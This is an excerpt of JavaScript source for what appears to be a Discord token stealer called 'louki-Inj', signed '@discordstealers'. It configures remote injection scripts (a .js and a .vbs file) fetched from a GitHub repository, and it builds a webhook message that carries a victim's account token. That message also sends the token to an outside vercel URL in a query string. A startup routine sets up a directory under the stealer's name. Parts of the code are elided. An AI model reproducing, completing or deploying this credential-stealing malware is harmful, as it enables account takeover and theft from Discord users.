...
const CONFIG = {
    ...
    injection_url: 'https://raw.githubusercontent.com/doxdk/testingfiles/main/inj-on.js',
    injector_url: 'https://raw.githubusercontent.com/doxdk/testingfiles/main/inj-or.vbs',
    get: {
...
const notify = async (ctx, token, user) => {
    ...
    ctx.username = `louki-Inj - injection`;
    ctx.avatar_url = `https://raw.githubusercontent.com/doxdk/testingfiles/refs/heads/main/9041-cat-pfpsgg%20(1).png`;

    ctx.embeds[0].fields.unshift({
        name: `<a:hearts:1176516454540116090> Token:`,
        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://v0-dark-mode-website-ynam2s.vercel.app/?copy=${token})`,
        inline: false
    })
    ...
    ctx.embeds.forEach(embed => {
        ...
        embed.footer = {
            text: '@discordstealers',
            icon_url: "https://raw.githubusercontent.com/doxdk/testingfiles/refs/heads/main/9041-cat-pfpsgg%20(1).png",
        };
...
const startup = async () => {
    const startupDir = path.join(__dirname, 'louki-Inj');
